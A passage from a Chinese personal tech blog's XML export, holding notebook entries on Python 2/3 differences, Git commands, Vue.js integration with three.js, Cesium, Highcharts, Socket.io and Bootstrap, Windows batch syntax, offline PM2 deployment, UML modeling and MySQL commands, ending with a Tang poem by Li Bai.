dict.has_key()，用 in替代它吧 。 异常 在 Python 3 中处理异常也轻微的改变了，在 Python 3 中我们现在使用 as 作为关键词。 捕获异常的语法由 except exc, var 改为 except exc as var。使用语法except (exc1, exc2) as var可以同时捕获多种类别的异常。 Python 2.6已经支持这两种语法。 解析用户的输入 在python2.x中raw_input()和input()，两个函数都存在，其中区别为 raw_input()—-将所有输入作为字符串看待，返回字符串类型 input()——-只能接收“数字”的输入，在对待纯数字输入时具有自己的特性，它返回所输入的数字的类型（int, float） 在python3.x中raw_input()和input()进行了整合，去除了raw_input()，仅保留了input()函数，其接收任意任性输入，将所有输入默认为字符串处理，并返回字符串类型。 返回可迭代对象，而不是列表如果在 xrange 章节看到的，现在在 Python 3 中一些方法和函数返回迭代对象 — 代替 Python 2 中的列表。 因为我们通常那些遍历只有一次，我认为这个改变对节约内存很有意义。尽管如此，它也是可能的，相对于生成器 —- 如需要遍历多次。它是不那么高效的。 而对于那些情况下，我们真正需要的是列表对象，我们可以通过 list() 函数简单的把迭代对象转换成一个列表。12345678910111213#!/usr/bin/python2&gt;&gt;&gt; print range(3) [0, 1, 2]&gt;&gt;&gt; print type(range(3))&lt;type &apos;list&apos;&gt;#!/usr/bin/python3&gt;&gt;&gt; print(range(3))range(0, 3)&gt;&gt;&gt; print(type(range(3)))&lt;class &apos;range&apos;&gt;&gt;&gt;&gt; print(list(range(3)))[0, 1, 2] For循环变量和全局命名空间泄漏在 Python 3.x 中 for 循环变量不会再导致命名空间泄漏。 在 Python 3.x 中做了一个改变，在 What’s New In Python 3.0 中有如下描述：“列表推导不再支持 [… for var in item1, item2, …] 这样的语法。使用 [… for var in (item1, item2, …)] 代替。1234567891011121314151617#!/usr/bin/python2&gt;&gt;&gt; i = 1&gt;&gt;&gt; print &apos;before: i =&apos;, ibefore: i = 1&gt;&gt;&gt; print &apos;comprehension: &apos;, [i for i in range(5)]comprehension: [0, 1, 2, 3, 4]&gt;&gt;&gt; print &apos;after: i =&apos;, iafter: i = 4#!/usr/bin/python3&gt;&gt;&gt; i = 1&gt;&gt;&gt; print(&apos;before: i =&apos;, i)before: i = 1&gt;&gt;&gt; print(&apos;comprehension:&apos;, [i for i in range(5)])comprehension: [0, 1, 2, 3, 4]&gt;&gt;&gt; print(&apos;after: i =&apos;, i)after: i = 1 兼容python3与python2当前python3的普及还不尽人意，因此编写的python程序能同时兼容python2与python3是十分必要的。下面介绍同时支持python2与python3的方法。 放弃python 2.6之前的python版本 使用 2to3 工具对代码检查 使用python -3执行python程序 from future import “from future import”后即可使使用python的未来特性了。python的完整future特性可见 future 。python3中所有字符都变成了unicode。在python2中unicode字符在定义时需要在字符前面加 u，但在3中则不需要家u，而且在加u后程序会无法编译通过。为了解决该问题可以 “from future import unicode_literals” ，这样python2中字符的行为将和python3中保持一致，python2中定义普通字符将自动识别为unicode。 import问题 python3中“少”了很多python2的包，在大多情况下这些包之是改了个名字而已。我们可以在import的时候对这些问题进行处理。 1234567try:#python2 from UserDict import UserDict #建议按照python3的名字进行import from UserDict import DictMixin as MutableMappingexcept ImportError:#python3 from collections import UserDict from collections import MutableMapping 使用python3的方式写程序 检查当前运行的python版本 12345import sysif sys.version &gt; &apos;3&apos;: PY3 = Trueelse: PY3 = False six不推荐使用six。 参考链接 https://zh.wikipedia.org/wiki/Python, by wikipedia https://www.jianshu.com/p/85583e032eb8, by EarthChen http://python.jobbole.com/83987/, by 天地一沙鸥]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git用法总结]]></title>
    <url>%2F2018%2F05%2F24%2FGit%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[git是一个分布式版本控制软件，最初由林纳斯·托瓦兹（Linus Torvalds）创作，于2005年以GPL发布。最初目的是为更好地管理Linux内核开发而设计[1]。 新建代码库12345678# 在当前目录新建一个Git代码库$ git init# 新建一个目录，将其初始化为Git代码库$ git init [project-name]# 下载一个项目和它的整个代码历史$ git clone [url] 配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 123456789# 显示当前的Git配置$ git config --list# 编辑Git配置文件$ git config -e [--global]# 设置提交代码时的用户信息$ git config [--global] user.name &quot;[name]&quot;$ git config [--global] user.email &quot;[email address]&quot; 代码提交123456789101112131415161718# 提交暂存区到仓库区$ git commit -m [message]# 提交暂存区的指定文件到仓库区$ git commit [file1] [file2] ... -m [message]# 提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a# 提交时显示所有diff信息$ git commit -v# 使用一次新的commit，替代上一次提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message]# 重做上一次commit，并包括指定文件的新变化$ git commit --amend [file1] [file2] ... 查看信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# 显示有变更的文件$ git status# 显示当前分支的版本历史$ git log# 显示commit历史，以及每次commit发生变更的文件$ git log --stat# 搜索提交历史，根据关键词$ git log -S [keyword]# 显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s# 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件$ git log [tag] HEAD --grep feature# 显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file]# 显示指定文件相关的每一次diff$ git log -p [file]# 显示过去5次提交$ git log -5 --pretty --oneline# 显示所有提交过的用户，按提交次数排序$ git shortlog -sn# 显示指定文件是什么人在什么时间修改过$ git blame [file]# 显示暂存区和工作区的差异$ git diff# 显示暂存区和上一个commit的差异$ git diff --cached [file]# 显示工作区与当前分支最新commit之间的差异$ git diff HEAD# 显示两次提交之间的差异$ git diff [first-branch]...[second-branch]# 显示今天你写了多少行代码$ git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;# 显示某次提交的元数据和内容变化$ git show [commit]# 显示某次提交发生变化的文件$ git show --name-only [commit]# 显示某次提交时，某个文件的内容$ git show [commit]:[filename]# 显示当前分支的最近几次提交$ git reflog 不常用操作 查看代码仓库中标签 1git tag 检出指定标签代码 1git checkout tag_name 丢弃本地修改 1git checkout . 打包导出仓库代码 1git archive --format zip --output ..\emsdk\zips\1.38.8.zip HEAD 参考链接 Git, by wikipedia git 如何获取指定 tag 代码, by 一介布衣 常用 Git 命令清单,by 阮一峰]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js集成three.js]]></title>
    <url>%2F2018%2F05%2F13%2FVue-js%E9%9B%86%E6%88%90three-js%2F</url>
    <content type="text"><![CDATA[Three.js是一个跨浏览器的脚本，使用JavaScript函数库或API来在网页浏览器中创建和展示动画的三维计算机图形。Three.js使用WebGL。源代码托管在GitHub。 下面介绍在Vue.js中集成three.js的步骤。 安装vue-cli脚手架 安装three.js 1npm install --save three 编写使用three.js创建3D场景的Vuejs组件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;template&gt; &lt;div id=&quot;container&quot;&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import * as Three from &apos;three&apos;export default &#123; name: &apos;Home&apos;, data () &#123; return &#123; camera: null, scene: null, renderer: null, mesh: null &#125; &#125;, methods: &#123; init: function () &#123; var container = document.getElementById(&apos;container&apos;) this.camera = new Three.PerspectiveCamera(70, container.clientWidth / container.clientHeight, 0.01, 10) this.camera.position.z = 1 this.scene = new Three.Scene() var geometry = new Three.BoxGeometry(0.2, 0.2, 0.2) var material = new Three.MeshNormalMaterial() this.mesh = new Three.Mesh(geometry, material) this.scene.add(this.mesh) this.renderer = new Three.WebGLRenderer(&#123; antialias: true &#125;) this.renderer.setSize(container.clientWidth, container.clientHeight) container.appendChild(this.renderer.domElement) &#125;, animate: function () &#123; requestAnimationFrame(this.animate) this.mesh.rotation.x += 0.01 this.mesh.rotation.y += 0.02 this.renderer.render(this.scene, this.camera) &#125; &#125;, mounted () &#123; this.init() this.animate() &#125;&#125;&lt;/script&gt;&lt;style rel=&quot;stylesheet/scss&quot; lang=&quot;scss&quot; scoped&gt;#container &#123; width: 100%; height: 100%; margin: 0; padding: 0; overflow: hidden;&#125;&lt;/style&gt; 参考链接 https://zh.wikipedia.org/wiki/Three.js, by Wikipedia https://stackoverflow.com/questions/47849626/import-and-use-three-js-library-in-vue-component, by Stackoverlflow]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows批处理编程语法解析]]></title>
    <url>%2F2018%2F05%2F13%2FWindows%E6%89%B9%E5%A4%84%E7%90%86%E7%BC%96%E7%A8%8B%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[批处理文件(BAT文件)是DOS，OS/2和Microsoft Windows中的一种脚本文件[1]。 它由命令行解释器执行的一系列命令组成，存储在纯文本文件中，通常以BAT为扩展名。批处理文件可以包含解释器交互接受的任何命令，并使用在批处理文件中启用条件分支和循环的构造，如IF，FOR和GOTO标签。在Windows平台自动化部署或处理日常重复性工作时，常使用Windows批处理文件。 下面简单介绍Windows BAT文件的语法。 @ 让执行窗口中不显示它后面这一行的命令本身。12// 使用@将不显示后面的echo off命令@ echo off echo echo即回显或反馈的意思。它由两种状态：打开和关闭。1234// 将不显示后续的命令@ echo off// 将显示后续的命令@ echo on :: 注释命令。在批处理文件中与rem命令等效 call call命令用来从一个批处理文件调用另一个批处理文件。只有当被调用的批处理文件执行完成时，才返回。1call pm2-startup install pause 暂停命令。方便用户查看信息，查看完毕后可继续执行。 explorer 在 cmd 下输入explorer可打开文件夹图形界面，例如：12// 在图形界面中打开当前文件夹explorer . 参考链接 Batch file,by Wikipedia. 批处理最完整人性化教程(.bat文件语法), by s1ihome.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>bat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js集成Cesium]]></title>
    <url>%2F2018%2F05%2F11%2FVue-js%E9%9B%86%E6%88%90Cesium%2F</url>
    <content type="text"><![CDATA[近期在研究集成封装Cesium为Vue.js组件，记录一下过程，防止忘了。 安装环境 node.js: v8.9.4 npm: 5.6.0 vue: 2.5.2 cesium: 1.45.0 vue-cli: 2.9.3 webpack: 3.6.0 注意此处vue-cli版本是2，因此该教程不适用vue-cli 3。如需在Vue-cli 3中构建Cesium，请参考Vue-cli 3.0 + cesium 构建. 安装配置 安装nodejs 安装vue-cli脚手架 12345npm install -g vue-clivue init webpack my-projectcd my-projectnpm installnpm run dev 安装cesium 1npm install --save cesium webpack配置 在build/webpack.base.conf.js文件中做如下修改 123456789101112131415161718192021222324252627282930313233343536//定义cesium源代码位置const cesiumSource = &apos;../node_modules/cesium/Source&apos;...module.exports = &#123;...output: &#123; path: config.build.assetsRoot, filename: &apos;[name].js&apos;, publicPath: process.env.NODE_ENV === &apos;production&apos; ? config.build.assetsPublicPath : config.dev.assetsPublicPath, // Needed to compile multiline strings in Cesium sourcePrefix: &apos;&apos; &#125;,amd:&#123; // Enable webpack-friendly use of require in Cesium toUrlUndefined: true &#125;,resolve: &#123; extensions: [&apos;.js&apos;, &apos;.vue&apos;, &apos;.json&apos;], alias: &#123; &apos;vue$&apos;: &apos;vue/dist/vue.esm.js&apos;, &apos;@&apos;: resolve(&apos;src&apos;), //设置cesium的别名 &apos;cesium&apos;: path.resolve(__dirname, cesiumSource) &#125; &#125;,module: &#123; rules: [ ... ], //不让Webpack打印载入特定库时候的警告 unknownContextCritical: false &#125;,...&#125; 在build/webpack.dev.conf.js文件中做如下修改 12345678910111213141516//定义 Cesium 源代码路径，前面没有../const cesiumSource = &apos;node_modules/cesium/Source&apos;//定义 Cesium Workers 路径const cesiumWorkers = &apos;../Build/Cesium/Workers&apos;...plugins: [ ... new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, cesiumWorkers), to: &apos;Workers&apos; &#125; ]), new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &apos;Assets&apos;), to: &apos;Assets&apos; &#125; ]), new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &apos;Widgets&apos;), to: &apos;Widgets&apos; &#125; ]), new webpack.DefinePlugin(&#123; // Define relative base path in cesium for loading assets CESIUM_BASE_URL: JSON.stringify(&apos;&apos;) &#125;) ... ] 在build/webpack.prod.conf.js文件中做如下修改 12345678910111213141516//定义 Cesium 源代码路径，前面没有../const cesiumSource = &apos;node_modules/cesium/Source&apos;//定义 Cesium Workers 路径const cesiumWorkers = &apos;../Build/Cesium/Workers&apos;...plugins: [ ... new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, cesiumWorkers), to: &apos;Workers&apos; &#125; ]), new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &apos;Assets&apos;), to: &apos;Assets&apos; &#125; ]), new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &apos;Widgets&apos;), to: &apos;Widgets&apos; &#125; ]), new webpack.DefinePlugin(&#123; //定义 Cesium 从哪里加载资源，如果使用默认的&apos;&apos;，却变成了绝对路径了，所以这里使用&apos;./&apos;,使用相对路径 CESIUM_BASE_URL: JSON.stringify(&apos;./&apos;) &#125;) ... ] Vue.js组件编写 在src/components下新建 CesiumViewer.vue vue组件 12345678910111213141516171819202122232425&lt;template&gt; &lt;div id=&quot;cesiumContainer&quot;&gt; &lt;/div&gt;&lt;/template&gt;&lt;script type=&quot;text/javascript&quot;&gt;import Cesium from &apos;cesium/Cesium&apos;import widgets from &apos;cesium/Widgets/widgets.css&apos;export default &#123; name: &apos;CesiumViewer&apos;, mounted () &#123; var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;) &#125;&#125;&lt;/script&gt;&lt;style rel=&quot;stylesheet/scss&quot; lang=&quot;scss&quot; scoped&gt;#cesiumContainer &#123; width: 100%; height: 100%; margin: 0; padding: 0; overflow: hidden;&#125;&lt;/style&gt; 创建全局样式文件src/styles/index.scss，做如下修改 12345678html,body &#123; width: 100%; height: 100%; margin: 0; padding: 0; overflow: hidden;&#125; 在src/main.js中做如下修改 1import &apos;@/styles/index.scss&apos; // global css 参考链接 基于webpack 构建Cesium + Vue 的应用, by QingMings Vue-cli 3.0 + cesium 构建,by QingMings. cesium-and-webpack, by cesiumjs.org vue-cli生成的项目，main.js引入scss时报错,by segmentfault.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[离线环境下Node.js应用部署方法]]></title>
    <url>%2F2018%2F05%2F10%2F%E7%A6%BB%E7%BA%BF%E7%8E%AF%E5%A2%83%E4%B8%8BNode-js%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[离线环境下Node.js应用部署时需要解决以下三个基本问题： Node.js应用的进程管理，如性能监控、自动重启、负载均衡等 Node.js应用开机如何自启动 离线环境下如何部署Node.js应用 下面以在Windows Server 2012上离线部署Node.js应用为例，记录上述问题的解决方案： Node.js应用的进程管理在生产环境中运行 Express 应用程序时，使用进程管理器对于完成以下任务很有帮助[1]： 在应用程序崩溃后将其重新启动。 获得对运行时性能和资源消耗的洞察。 动态修改设置以改善性能。 控制集群。 进程管理器有点类似于应用程序服务器：它是应用程序的“容器”，可促进部署，提供高可用性并使您可以在运行时管理应用程序。 用于 Express 和其他 Node.js 应用程序的最流行的进程管理器包括： StrongLoop Process Manager PM2 Forever 上述三种工具的比较请参阅http://strong-pm.io/compare/。其中，StrongLoop Process Manager无法在Windows平台工作，再综合比较PM2和Forever，由于Forever没有操作系统自启动的脚本，故选择PM2作为Windows平台Node.js应用的进程管理器。 Node.js应用开机如何自启动选择PM2作为Node.js应用的进程管理器后，Node.js应用开机自启动的问题就变为如何开机自启动PM2。Windows平台存在两个自启动PM2的脚本： pm2-windows-service pm2-windows-startup pm2-windows-service基于 node-windows将PM2注册为Windows服务，从而实现自启动。pm2-windows-startup则基于start-on-windows-boot在注册表中将PM2设为自启动程序，从而实现自启动。两种方案经测试，只有pm2-windows-startup在Windows Server 2012上可行，故选择pm2-windows-startup作为解决Node.js应用开机自启动的方案。 离线环境下如何部署Node.js应用PM2和pm2-windows-startup必须全局安装，如何简单方便地在离线环境下全局安装这两个模块是一个问题。网上搜到的方法有： npm link npm-bundle npm link[2]是npm的一个命令，可将本地包链接成全局包，但实际测试过程中，无法解决PM2包的依赖问题，故放弃。而npm-bundle[3]则能很好的解决PM2的依赖问题。具体过程为： 123456\\在线环境下全局安装npm install -g pm2npm install -g pm2-windows-startupnpm install -g npm-bundlenpm-bundle pm2npm-bundle pm2-windows-startup 离线部署Nodejs Express应用1234567@echo offSET NODE_ENV=productioncall npm install .\pm2-2.10.3.tgz -g call npm install .\pm2-windows-startup-1.0.3.tgz -gcall pm2-startup install call pm2 start ./bin/www -i 0call pm2 save 离线卸载Nodejs Express应用12345@echo offcall pm2 stop allcall pm2-startup uninstallcall npm uninstall pm2 -gcall npm uninstall pm2-windows-startup -g 参考链接 Express 应用程序的进程管理器, by Express npm离线安装全局包,内网安装npm中的包, by 爱死费崇政 What exact command is to install pm2 on offline RHEL, by stackoverflow. NodeJS: PM2 Startup on Windows,by Walter Accantelli. bat脚本%cd%和%~dp0获取当前目录区别,by dmfrm]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js集成Highcharts]]></title>
    <url>%2F2018%2F05%2F10%2FVue-js%E9%9B%86%E6%88%90Highcharts%2F</url>
    <content type="text"><![CDATA[Vue.js集成Highcharts方法 安装highcharts 1npm install --save highcharts 封装hightcharts成Vue.js组件 12345678910111213141516171819202122232425262728293031323334353637&lt;template&gt; &lt;div class=&quot;highcharts-container&quot;&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import Highcharts from &apos;highcharts/highstock&apos;import HighchartsMore from &apos;highcharts/highcharts-more&apos;import HighchartsDrilldown from &apos;highcharts/modules/drilldown&apos;import Highcharts3D from &apos;highcharts/highcharts-3d&apos;HighchartsMore(Highcharts)HighchartsDrilldown(Highcharts)Highcharts3D(Highcharts)export default &#123; props: [&apos;options&apos;], name: &apos;HighCharts&apos;, data () &#123; return &#123; chart: null &#125; &#125;, watch: &#123; options: function (newVal, oldVal) &#123; // watch it this.chart.update(newVal, true) &#125; &#125;, mounted () &#123; this.initChart() &#125;, methods: &#123; initChart () &#123; this.chart = new Highcharts.Chart(this.$el, this.options) &#125; &#125;&#125;&lt;/script&gt; 在src/main.js引入组件 12import HighCharts from &apos;./components/HighCharts.vue&apos;Vue.component(&apos;HighCharts&apos;, HighCharts) 使用组件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;template&gt; &lt;div class=&quot;radarGraph&quot;&gt; &lt;HighCharts :options=&quot;options&quot; class=&quot;radar&quot; &gt;&lt;/HighCharts&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: &apos;RadarGraph&apos;, computed: &#123; gameInfo () &#123; return this.$store.state.gameInfo &#125;, options () &#123; return &#123; chart: &#123; polar: true, type: &apos;line&apos;, marginTop: 0, marginBottom: 0, marginLeft: 0, marginRight: 0 &#125;, credits: &#123; enabled: false &#125;, pane: &#123; size: &apos;75%&apos; &#125;, title: null, legend: &#123; enabled: false &#125;, xAxis: &#123; categories: [&apos;分类1&apos;, &apos;分类2&apos;, &apos;分类3&apos;, &apos;分类4&apos;, &apos;分类5&apos;, &apos;分类6&apos; ], labels: &#123; style: &#123; fontSize: &apos;14px&apos; &#125; &#125;, tickmarkPlacement: &apos;on&apos;, lineWidth: 0 &#125;, yAxis: &#123; gridLineInterpolation: &apos;polygon&apos;, lineWidth: 0, min: 0 &#125;, series: [&#123; type: &apos;area&apos;, name: &apos;得分&apos;, data: [this.gameInfo.radar1, this.gameInfo.radar2, this.gameInfo.radar3, this.gameInfo.radar4, this.gameInfo.radar5, this.gameInfo.radar6], pointPlacement: &apos;on&apos; &#125;] &#125; &#125;, ...mapGetters([ &apos;userId&apos; ]) &#125;, created () &#123; this.fetchData() &#125;, methods: &#123; fetchData () &#123; this.$store.dispatch(&apos;GetGameInfo&apos;, this.userId) &#125; &#125;&#125;&lt;/script&gt; 参考链接 在 Vue 中使用 Highcharts,by 简数科技.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js集成Socket.io]]></title>
    <url>%2F2018%2F05%2F09%2FVue-js%E9%9B%86%E6%88%90Socket-io%2F</url>
    <content type="text"><![CDATA[Socket.IO简介 Socket.IO 是一个面向实时 web 应用的 JavaScript 库。它使得服务器和客户端之间实时双向的通信成为可能。他有两个部分：在浏览器中运行的客户端库，和一个面向Node.js的服务端库。两者有着几乎一样的API。像Node.js一样，它也是事件驱动的. Socket.IO 主要使用WebSocket协议。但是如果需要的话，Socket.io可以回退到几种其它方法，例如Adobe Flash Sockets，JSONP拉取，或是传统的AJAX拉取，[2]并且在同时提供完全相同的接口。尽管它可以被用作WebSocket的包装库，它还是提供了许多其它功能，比如广播至多个套接字，存储与不同客户有关的数据，和异步IO操作。 Vue.js集成Socket.IO 安装socket.io-client 1npm install --save socket.io-client 在src/main.js中载入socket.io-client 123import io from &apos;socket.io-client&apos;const socket = io(process.env.BASE_API)Object.defineProperty(Vue.prototype, &apos;$socket&apos;, &#123; value: socket &#125;) 在Vuejs组件中使用socket.io-client 1this.$socket.on(&apos;event&apos;,function(e)&#123;&#125;) 参考链接 https://zh.wikipedia.org/wiki/Socket.IO, by Wikipedia https://socket.io/get-started/chat/, by socket.io]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PowerDesigner使用经验总结]]></title>
    <url>%2F2018%2F05%2F09%2FPowerDesigner%E4%BD%BF%E7%94%A8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[需求分析在系统工程及软件工程中，需求分析指的是在创建一个新的或改变一个现存的系统或产品时，确定新系统的目的、范围、定义和功能时所要做的所有工作。需求分析是软件工程中的一个关键过程。在这个过程中，系统分析员和软件工程师确定顾客的需要。只有在确定了这些需要后他们才能够分析和寻求新系统的解决方法。 在软件工程的历史中，很长时间里人们一直认为需求分析是整个软件工程中最简单的一个步骤，但在过去十年中越来越多的人认识到它是整个过程中最关键的一个过程。假如在需求分析时，分析者们未能正确地认识到顾客的需要的话，那么最后的软件实际上不可能达到顾客的需要，或者软体无法在规定的时间里完工。 软件设计软件设计是从软件需求规格说明书出发，根据需求分析阶段确定的功能设计软件系统的整体结构、划分功能模块、确定每个模块的实现算法以及编写具体的代码，形成软件的具体设计方案。 软件设计是把许多事物和问题抽象起来，并且抽象它们不同的层次和角度。将问题或事物分解并模块化使得解决问题变得容易，分解的越细模块数量也就越多，它的副作用就是使得设计者考虑更多的模块之间耦合度的情况。 UML统一建模语言（英语：Unified Modeling Language，缩写UML）是一种开放的方法，用于说明、可视化、构建和编写一个正在开发的、面向对象的、软件密集系统的制品的开放方法。UML展现了一系列最佳工程实践，这些最佳实践在对大规模，复杂系统进行建模方面，特别是在软件架构层次已经被验证有效。 这个语言由葛来迪·布区，伊瓦尔·雅各布森与詹姆士·兰宝于1994年至1995年间，在Rational Software公司中开发，于1996年，又进一步发展。UML集成了Booch，OMT和面向对象软件工程的概念，将这些方法融合为单一的，通用的，并且可以广泛使用的建模语言。UML打算成为可以对并发和分布式系统的标准建模语言。 在UML系统开发中有三个主要的模型： 功能模型：从用户的角度展示系统的功能，包括用例图。 静态模型：采用对象，属性，操作，关联等概念展示系统的结构和基础，包括类别图、对象图。 动态模型：展现系统的内部行为。包括序列图，活动图，状态图。） PowerDesigner工具PowerDesigner是Sybase的企业建模和设计解决方案，采用模型驱动方法，将业务与IT结合起来，可帮助部署有效的企业体系架构，并为研发生命周期管理提供强大的分析与设计技术。 PowerDesigner独具匠心地将多种标准数据建模技术（UML、业务流程建模以及市场领先的数据建模）集成一体，并与 .NET、WorkSpace、PowerBuilder、Java™、Eclipse 等主流开发平台集成起来，从而为传统的软件开发周期管理提供业务分析和规范的数据库设计解决方案。此外，它支持60多种关系数据库管理系统（RDBMS）／版本[来源请求]。PowerDesigner运行在Microsoft Windows平台上，并提供了Eclipse插件。 PowerDesigner使用经验遵循UML方法，使用PowerDesigner对系统进行建模。 在需求分析阶段，通常使用用例图、序列图（序列图中主要描述用户与系统之间交互关系）、组合结构图、类图（用于描述组件或类的接口及其调用关系）等UML图描述。 在设计阶段，从架构设计、概要设计到详细设计，粒度由粗到细。 通常架构设计是有关软件整体结构与组件的抽象描述，用于指导大型软件系统各个方面的设计。架构设计通常使用组织结构图、对象图、活动图、状态图等UML图描述。 概要设计就是设计软件的结构，包括组成模块，模块的层次结构，模块的调用关系，每个模块的功能等等。同时，还要设计该项目的应用系统的总体数据结构和数据库结构，即应用系统要存储什么数据，这些数据是什么样的结构，它们之间有什么关系。概要设计从模块角度描述系统，通常使用组合结构图进行描述。 详细设计就是为每个模块完成的功能进行具体的描述，要把功能描述转变为精确的、结构化的过程描述。如采用面向对象的开发方法，详细设计通常使用UML类图描述。]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js集成Bootstrap4]]></title>
    <url>%2F2018%2F05%2F09%2FVue-js%E9%9B%86%E6%88%90Bootstrap4%2F</url>
    <content type="text"><![CDATA[记录在Vue.js中集成Bootstrap4的方法，防止忘了！ 环境配置 vue-cli: 2.x 集成过程 创建Vue.js工程 12npm install -g vue-clivue init webpack project_name 安裝 Sass-loader / node-sass 1npm install sass-loader node-sass --save-save 安裝BootStrap / jQuery / Popper 1npm install bootstrap jquery popper.js --save 配置build/webpack.base.conf.js 123456789101112module.exports = &#123; ... // 新增plugins plugins: [ new webpack.ProvidePlugin(&#123; &apos;$&apos;: &quot;jquery&quot;, &apos;jQuery&apos;: &quot;jquery&quot;, &apos;Popper&apos;: &apos;popper.js&apos; &#125;) ], ...&#125; 在src/main.js中载入Bootstrap 12import &apos;bootstrap&apos;import &apos;bootstrap/dist/css/bootstrap.css&apos; 使用Bootstrap和sass编写Vue.js组件 参考链接 Bootstrap Webpack,by bootstrap homepage. Setup Bootstrap 4 With Vue Cli 3 Webpack,by lua software code. Adding Bootstrap to a Vue CLI Project,by Travis Horn.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux MySQL 终端操作]]></title>
    <url>%2F2018%2F05%2F08%2FLinux-MySQL-%E7%BB%88%E7%AB%AF%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[进入mysql数据库 1#mysql -uroot -proot 创建mysql user 12MariaDB [(none)]&gt; create user &apos;stock&apos;@&apos;localhost&apos; identified by &apos;stock&apos;;Query OK, 0 rows affected (0.00 sec) 查询mysql用户 12345678MariaDB [(none)]&gt; SELECT User,Host FROM mysql.user;+-------+-----------+| User | Host |+-------+-----------+| root | localhost || stock | localhost |+-------+-----------+2 rows in set (0.00 sec) 授予mysql用户权限 12MariaDB [(none)]&gt; GRANT ALL ON stock.* TO &apos;stock&apos;@&apos;localhost&apos;;Query OK, 0 rows affected (0.00 sec) 使用show语句查找数据库 123456789MariaDB [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema |+--------------------+3 rows in set (0.00 sec) 创建数据库stock 12MariaDB [(none)]&gt; create database stock;Query OK, 1 row affected (0.00 sec) 选择创建的数据库 12MariaDB [(none)]&gt; use stock;Database changed 使用show语句查找数据库中的表 1MariaDB [stock]&gt; show tables; 删除创建的数据库 12MariaDB [(none)]&gt; drop database stock;Query OK, 0 rows affected (0.00 sec) 删除表 12mysql&gt; drop table sequelizemeta;Query OK, 0 rows affected (0.01 sec) 查询表结构 1mysql&gt; desc t_records; 清除表记录 1mysql&gt; delete from t_records;]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[侠客行]]></title>
    <url>%2F2018%2F05%2F08%2F%E4%BE%A0%E5%AE%A2%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[作者：李白 赵客缦胡缨，吴钩霜雪明。 银鞍照白马，飒沓如流星。 十步杀一人，千里不留行。 事了拂衣去，深藏身与名。 闲过信陵饮，脱剑膝前横。 将炙啖朱亥，持觞劝侯嬴。 三杯吐然诺，五岳倒为轻。 眼花耳热后，意气素霓生。 救赵挥金锤，邯郸先震惊。 千秋二壮士，烜赫大梁城。 纵死侠骨香，不惭世上英。 谁能书阁下，白首太玄经。]]></content>
      <tags>
        <tag>传统文化</tag>
        <tag>唐诗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[立功立德立言]]></title>
    <url>%2F2018%2F05%2F08%2F%E7%AB%8B%E5%8A%9F%E7%AB%8B%E5%BE%B7%E7%AB%8B%E8%A8%80%2F</url>
